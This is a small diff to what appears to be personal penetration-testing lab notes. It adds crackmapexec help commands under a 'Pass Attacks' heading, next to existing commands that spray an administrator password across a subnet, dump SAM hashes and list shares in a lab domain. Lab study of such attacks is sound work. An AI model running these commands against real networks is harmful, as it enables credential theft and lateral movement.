@@ -38,6 +38,9 @@ crackmapexec 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth
 
 -- Pass Attacks --
 
+crackmapexec --help
+crackmapexec smb --help
+
 crackmapexec smb 192.168.57.0/24 -u administrator -d marvel.local -p Password1
 crackmapexec smb 192.168.57.0/24 -u administrator -d MARVEL -p Password1 --sam
 crackmapexec smb 192.168.57.0/24 -u administrator -d MARVEL -p Password1 --shares
